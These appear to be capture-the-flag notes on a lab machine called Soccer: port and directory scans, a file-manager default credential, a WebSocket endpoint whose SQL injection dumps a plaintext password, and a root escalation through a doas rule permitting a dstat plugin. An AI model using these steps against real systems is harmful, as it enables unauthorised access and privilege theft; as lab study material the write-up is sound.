# Soccer

> ip: 10.10.11.194

## Port Scan (Nmap)
```bash
# Nmap 7.93 scan initiated Wed Jan 11 10:15:28 2023 as: nmap -sC -sV -p- -T4 -oA nmap/initial 10.10.11.194                                                                         [36/154]
Nmap scan report for 10.10.11.194
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 11 Jan 2023 09:23:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 11 Jan 2023 09:23:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```
## Directory fuzzing (gobuster)
```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/11 10:27:52 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

TinyFileManager v2.4.3 -> default cred: admin:admin@123

New subdomain in nginx sites-enabled: soc-player.soccer.htb
```js
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {

        var btn = document.getElementById('btn');
        var input = document.getElementById('id');

        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });

        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }

        function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
        }

        ws.onmessage = function (e) {
        append(e.data)
        }
```
Tables enumeration sqlmap:
```bash
+---------+-------------------+----------------------+----------+
| id      | email             | password             | username |
+---------+-------------------+----------------------+----------+
| 1324    | player@player.htb | PlayerOftheMatch2022 | player   |
| <blank> | <blank>           | <blank>              | <blank>  |
| <blank> | <blank>           | <blank>              | <blank>  |
+---------+-------------------+----------------------+----------+
```
```bash
player@soccer:/dev/shm$ ls -al /usr/local/bin/doas
-rwsr-xr-x 1 root root 42224 Nov 17 09:09 /usr/local/bin/doas
player@soccer:/dev/shm$ /usr/local/bin/doas
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
player@soccer:/dev/shm$
player@soccer:/dev/shm$ ls /usr/local/etc/doas.conf
/usr/local/etc/doas.conf
player@soccer:/dev/shm$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
player@soccer:/dev/shm$ cd /usr/local/share/dstat/
player@soccer:/usr/local/share/dstat$ ls
player@soccer:/usr/local/share/dstat$ vim dstat_ex.py
player@soccer:/usr/local/share/dstat$ doas -u root dstat --ex
doas: Operation not permitted
player@soccer:/usr/local/share/dstat$ doas dstat --ex
doas: Operation not permitted
player@soccer:/usr/local/share/dstat$ doas dstat
doas: Operation not permitted
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat
You did not select any stats, using -cdngy by default.
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw
  1   1  98   0   0|  86k   43k|   0     0 |   0     0 | 304   574
  0   0 100   0   0|   0     0 | 198B 1198B|   0     0 | 263   496 ^C
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --ex
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# ls
dstat_ex.py
root@soccer:/usr/local/share/dstat#
```
